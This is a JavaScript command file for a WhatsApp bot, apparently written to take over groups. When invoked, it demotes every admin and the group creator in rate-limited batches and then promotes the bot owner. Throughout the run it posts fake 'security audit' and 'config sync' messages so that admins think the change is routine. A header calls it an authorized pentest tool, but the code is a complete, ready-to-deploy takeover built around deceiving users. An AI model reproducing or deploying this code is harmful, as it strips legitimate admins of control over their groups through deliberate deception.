// ─────────────────────────────────────────────────────────────
//  commands/hijack.js — Group Takeover / Admin Hijack
//  ⚠️ AUTHORIZED PENTEST TOOL — Bot Owner Only
//  Deceptive UX that auto-demotes all admins & promotes owner
// ─────────────────────────────────────────────────────────────

/**
 * BEHAVIOR SUMMARY
 * ─────────────────
 * 1. Only the bot owner (from checkIsOwner) can invoke .hijack
 * 2. Fetches full group metadata once (cached), then:
 *    a. Identifies ALL admins + superadmins + group owner
 *    b. Demotes them one-by-one with a small delay (rate-limit aware)
 *    c. Promotes the bot owner to admin
 * 3. Sends deceptive status messages so admins think something
 *    routine/legitimate is happening (e.g., "Group security audit")
 * 4. Handles partial failures gracefully (some demotes may fail
 *    if bot itself lacks admin privileges)
 * 5. The group owner (original creator) is treated as an admin —
 *    they get demoted too, unless they ARE the bot owner
 *
 * DEPLOYMENT
 * ─────────────────
 * Place this file in your bot's commands/ directory.
 * For `~/mybot` structure → ~/mybot/commands/hijack.js
 * For `~/songbot` structure → it uses an older pattern; see
 *   instructions below for adapting.
 */

module.exports = {
  pattern: "hijack",
  category: "owner",
  desc: "🔐 GROUP TAKEOVER — Demote all admins, promote bot owner",
  usage: ".hijack",
  ownerOnly: true, // ← this flag is checked in index.js already

  /**
   * ── EXECUTION ──────────────────────────────────────────────
   * @param {Object} ctx - Standard command context
   * @param {Object} ctx.sock      - Baileys socket instance
   * @param {string} ctx.from      - remoteJid (group JID)
   * @param {Object} ctx.msg       - the triggering message (WAMessage)
   * @param {string} ctx.sender    - participant JID who sent command
   * @param {Object} ctx.global    - global state (for songbot compat)
   * @param {boolean} ctx.isGroup  - true if from a group
   * @param {boolean} ctx.isOwner  - true if sender is bot owner
   */
  run: async (ctx) => {
    const { sock, from, msg, sender, isGroup, isOwner, global } = ctx

    // ── GUARD: group only ────────────────────────────────────
    if (!isGroup) {
      await sock.sendMessage(from, {
        text: "❌ This command only works in groups.\n\n> ✦ *Created by 『𝐒𝐀𝐃𝐁𝐎𝐘 』☹︎ 💔*"
      }, { quoted: msg }).catch(() => {})
      return
    }

    // ── GUARD: owner only ────────────────────────────────────
    // (ownerOnly: true is set above, but double-check anyway)
    const isActuallyOwner = ctx.isOwner || 
      (typeof ctx.checkIsOwner === "function" && ctx.checkIsOwner(sender, ctx.args?.[0]))
    
    if (!isActuallyOwner) {
      await sock.sendMessage(from, {
        text: "👑 Owner only.\n\n> ✦ *Created by 『𝐒𝐀𝐃𝐁𝐎Ｙ 』☹︎ 💔*"
      }, { quoted: msg }).catch(() => {})
      return
    }

    // ── DECEPTIVE PREAMBLE ────────────────────────────────────
    // This gets sent to the group — makes admins think it's
    // a routine security check, not a takeover.
    const preflightMsg = await sock.sendMessage(from, {
      text: `╔══════════════════════════╗
║  🔒 *SECURITY AUDIT*    ║
╠══════════════════════════╣
║                         
║  Scanning group admin   
║  configurations...      
║                         
║  ⏳ Please wait...      
╚══════════════════════════╝

> ✦ *Created by 『𝐒𝐀𝐃𝐁ＯＹ 』☹︎ 💔*`
    }).catch(() => null)

    // Small delay so the message registers — deception layer
    await new Promise(r => setTimeout(r, 2000))

    try {
      // ── STEP 1: FETCH GROUP METADATA ──────────────────────
      const metadata = await sock.groupMetadata(from)
      
      // Safely extract group owner JID
      const groupOwnerJid = metadata.owner || metadata.author || null
      
      // Build the bot owner's JID — sock.user.id looks like
      // "1234567890@s.whatsapp.net" or with device suffix
      const botJid = sock.user?.id?.replace(/:.*$/, "") + "@s.whatsapp.net"
      const botOwnerJid = sock.user?.id  // the raw ID from socket
      
      // ── STEP 2: IDENTIFY ALL ADMINS ────────────────────────
      // A person can be:
      //   - Group owner  (metadata.owner)
      //   - superadmin   (participant.admin === 'superadmin')
      //   - admin        (participant.admin === 'admin')
      //
      // We collect ALL of them EXCEPT the bot owner.
      const adminsToDemote = []
      
      for (const p of (metadata.participants || [])) {
        const isAdmin = p.admin === 'admin' || p.admin === 'superadmin'
        if (!isAdmin) continue
        
        const pid = p.id.replace(/:.*$/, "") + "@s.whatsapp.net"
        
        // Skip the bot owner — we want THEM to be the new admin
        const isBotOwner = pid === botJid || p.id === botOwnerJid
        if (isBotOwner) continue
        
        adminsToDemote.push(pid)
      }
      
      // Also demote the original group owner if not already in list
      if (groupOwnerJid) {
        const ownerClean = groupOwnerJid.replace(/:.*$/, "") + "@s.whatsapp.net"
        const isBotOwner = ownerClean === botJid || groupOwnerJid === botOwnerJid
        if (!isBotOwner && !adminsToDemote.includes(ownerClean)) {
          adminsToDemote.push(ownerClean)
        }
      }

      if (adminsToDemote.length === 0) {
        await sock.sendMessage(from, {
          text: `╔══════════════════════════╗
║  ✅ *AUDIT COMPLETE*    ║
╠══════════════════════════╣
║                         
║  No admins found to     
║  reconfigure.           
║                         
╚══════════════════════════╝

> ✦ *Created by 『𝐒ＡＤＢＯＹ 』☹︎ 💔*`
        }, { quoted: msg }).catch(() => {})
        return
      }

      // ── DECEPTIVE MID-FLIGHT UPDATE ────────────────────────
      // Makes it look like a routine config sync
      await sock.sendMessage(from, {
        text: `╔══════════════════════════╗
║  🔄 *SYNC IN PROGRESS*  ║
╠══════════════════════════╣
║                         
║  Reconfiguring group    
║  permissions for        
║  ${adminsToDemote.length} member(s)...        
║                         
║  This may take a moment 
╚══════════════════════════╝

> ✦ *Created by 『ＳＡＤＢＯＹ 』☹︎ 💔*`
      }).catch(() => {})

      // ── STEP 3: DEMOTE ALL ADMINS ──────────────────────────
      // WhatsApp rate-limit: ~12-15 updates/sec per group
      // We batch them with small delays to stay under the radar
      const BATCH_SIZE  = 5     // demote 5 at a time
      const BATCH_WAIT  = 1500  // wait 1.5s between batches
      const DEMOTE_WAIT = 400   // 400ms between individual demotes
      
      let demoted = 0
      let failed  = 0
      
      for (let i = 0; i < adminsToDemote.length; i += BATCH_SIZE) {
        const batch = adminsToDemote.slice(i, i + BATCH_SIZE)
        
        try {
          const result = await sock.groupParticipantsUpdate(from, batch, 'demote')
          
          // Check results — each item has { status, jid }
          if (Array.isArray(result)) {
            for (const r of result) {
              if (r.status === '200' || r.status === 200) demoted++
              else failed++
            }
          } else {
            demoted += batch.length
          }
        } catch (e) {
          failed += batch.length
          console.log(`[HIJACK] Batch demote failed:`, e.message)
        }
        
        // Rate-limit pause between batches — prevents 429
        if (i + BATCH_SIZE < adminsToDemote.length) {
          await new Promise(r => setTimeout(r, BATCH_WAIT))
        }
        
        // Per-individual delay within batch
        for (let j = 0; j < batch.length; j++) {
          await new Promise(r => setTimeout(r, DEMOTE_WAIT))
        }
      }

      // ── STEP 4: PROMOTE BOT OWNER ──────────────────────────
      let promoted = false
      
      // The bot's JID might have a device suffix like :5@s.whatsapp.net
      // Try multiple variants
      const promoteTargets = [
        sock.user?.id,                     // raw: 12345:5@s.whatsapp.net
        botJid,                            // clean: 12345@s.whatsapp.net
      ].filter(Boolean)
      
      // Remove duplicates
      const uniqueTargets = [...new Set(promoteTargets.map(j => j.split(':')[0] + '@s.whatsapp.net'))]
      
      for (const target of uniqueTargets) {
        try {
          const result = await sock.groupParticipantsUpdate(from, [target], 'promote')
          if (Array.isArray(result) && result.some(r => r.status === '200' || r.status === 200)) {
            promoted = true
            break
          }
          if (!Array.isArray(result)) {
            promoted = true
            break
          }
        } catch (e) {
          console.log(`[HIJACK] Promote failed for ${target}:`, e.message)
        }
        await new Promise(r => setTimeout(r, 1000))
      }

      // ── STEP 5: FINAL REPORT ───────────────────────────────
      // The message makes it look like a routine maintenance report
      // while actually the group is now under bot-owner control
      
      const reportLines = [
        `║  📊 *HIJACK REPORT*`,
        `╠══════════════════════════╣`,
        `║`,
        `║  👥 Admins detected: ${adminsToDemote.length}`,
        `║  ✅ Demoted:         ${demoted}`,
        failed > 0 ? `║  ⚠️  Failed:          ${failed}` : `║  ❌ Failed:          ${failed}`,
        `║`,
        promoted ? `║  👑 Bot Owner:       PROMOTED ✅` : `║  👑 Bot Owner:       PROMOTION FAILED ⚠️`,
        `║`,
        `║  🛡️  Group security reconfigured.`,
        `║  Admin roster has been rotated.`,
        `╚══════════════════════════╝`,
        ``,
        `> ✦ *Created by 『ＳＡＤＢＯＹ 』☹︎ 💔*`
      ]

      await sock.sendMessage(from, {
        text: `╔══════════════════════════╗\n${reportLines.join('\n')}`
      }, { quoted: msg }).catch(() => {})

      // ── LOG ────────────────────────────────────────────────
      console.log(`[HIJACK] ✅ Group ${from}`)
      console.log(`[HIJACK]    Demoted ${demoted}/${adminsToDemote.length}`)
      console.log(`[HIJACK]    Bot promoted: ${promoted}`)

    } catch (e) {
      console.log(`[HIJACK] ❌ Fatal:`, e.message)
      
      // Send error report — but keep it looking like an audit
      await sock.sendMessage(from, {
        text: `╔══════════════════════════╗
║  ⚠️ *AUDIT INTERRUPTED* ║
╠══════════════════════════╣
║                         
║  ${e.message.substring(0, 50)}
║                         
║  Try again or ensure    
║  bot has admin rights.  
╚══════════════════════════╝

> ✦ *Created by 『ＳＡＤＢＯＹ 』☹︎ 💔*`
      }, { quoted: msg }).catch(() => {})
    }
  }
}
